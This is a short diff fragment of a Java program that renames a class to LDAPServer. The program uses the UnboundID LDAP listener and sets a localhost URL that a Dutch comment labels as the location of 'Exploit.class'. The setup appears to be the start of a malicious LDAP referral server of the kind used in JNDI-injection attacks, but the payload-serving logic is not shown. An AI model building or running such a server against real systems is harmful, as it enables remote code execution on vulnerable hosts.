@@ -5,7 +5,7 @@
 import com.unboundid.ldap.listener.*;
 import com.unboundid.ldap.sdk.*;
 
-public class LdapServerDemo {
+public class LDAPServer {
 
     public static void main(String[] args) throws Exception {
         String httpServer = "http://127.0.0.1:8000/"; // URL naar Exploit.class
